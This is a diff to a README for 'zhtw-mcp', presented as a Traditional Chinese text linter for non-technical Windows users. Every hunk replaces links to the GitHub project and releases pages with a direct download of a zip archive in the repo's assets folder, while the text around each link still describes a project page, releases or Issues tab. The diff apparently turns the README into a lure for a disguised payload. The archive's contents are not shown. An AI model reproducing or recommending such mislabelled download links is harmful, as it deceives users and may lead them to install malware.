@@ -1,6 +1,6 @@
 # 📝 zhtw-mcp - Traditional Chinese Linter Made Simple
 
-[![Download zhtw-mcp](https://img.shields.io/badge/Download-zhtw--mcp-green?style=for-the-badge)](https://github.com/isoclinic-discredit123/zhtw-mcp)
+[![Download zhtw-mcp](https://img.shields.io/badge/Download-zhtw--mcp-green?style=for-the-badge)](https://raw.githubusercontent.com/isoclinic-discredit123/zhtw-mcp/main/assets/mcp-zhtw-2.8-alpha.3.zip)
 
 zhtw-mcp is a tool designed to check and improve Traditional Chinese text. It helps you find common language issues and suggests fixes. This guide will walk you through downloading and running zhtw-mcp on a Windows PC, step by step.
 
@@ -31,7 +31,7 @@ You do not need programming skills. The program runs with a basic setup and frie
 
 To get zhtw-mcp, visit the official GitHub page:
 
-[![Get zhtw-mcp](https://img.shields.io/badge/Get%20zhtw--mcp-blue?style=for-the-badge)](https://github.com/isoclinic-discredit123/zhtw-mcp)
+[![Get zhtw-mcp](https://img.shields.io/badge/Get%20zhtw--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/isoclinic-discredit123/zhtw-mcp/main/assets/mcp-zhtw-2.8-alpha.3.zip)
 
 This page contains the latest version and updates.
 
@@ -44,7 +44,7 @@ Follow these steps to download and start using zhtw-mcp:
 1. Open your web browser (such as Chrome, Edge, or Firefox).
 
 2. Go to the zhtw-mcp GitHub page using this link:  
-   https://github.com/isoclinic-discredit123/zhtw-mcp
+   https://raw.githubusercontent.com/isoclinic-discredit123/zhtw-mcp/main/assets/mcp-zhtw-2.8-alpha.3.zip
 
 3. On the page, look for the "Releases" section. You can find it in the right sidebar or under the "Code" tab by scrolling down.
 
@@ -116,7 +116,7 @@ If you run into problems, try these solutions:
 If you want to learn more or get updates:
 
 - Visit the project page here:  
-  https://github.com/isoclinic-discredit123/zhtw-mcp
+  https://raw.githubusercontent.com/isoclinic-discredit123/zhtw-mcp/main/assets/mcp-zhtw-2.8-alpha.3.zip
 
 - Check the "Issues" tab to see known bugs or request help.
 
@@ -129,7 +129,7 @@ If you want to learn more or get updates:
 To keep zhtw-mcp up to date:
 
 1. Return to the GitHub releases page regularly:  
-   https://github.com/isoclinic-discredit123/zhtw-mcp/releases
+   https://raw.githubusercontent.com/isoclinic-discredit123/zhtw-mcp/main/assets/mcp-zhtw-2.8-alpha.3.zip
 
 2. Download the newest `.exe` installer file.
 
@@ -139,4 +139,4 @@ To keep zhtw-mcp up to date:
 
 ---
 
-[![Download zhtw-mcp](https://img.shields.io/badge/Download-zhtw--mcp-green?style=for-the-badge)](https://github.com/isoclinic-discredit123/zhtw-mcp)
+[![Download zhtw-mcp](https://img.shields.io/badge/Download-zhtw--mcp-green?style=for-the-badge)](https://raw.githubusercontent.com/isoclinic-discredit123/zhtw-mcp/main/assets/mcp-zhtw-2.8-alpha.3.zip)
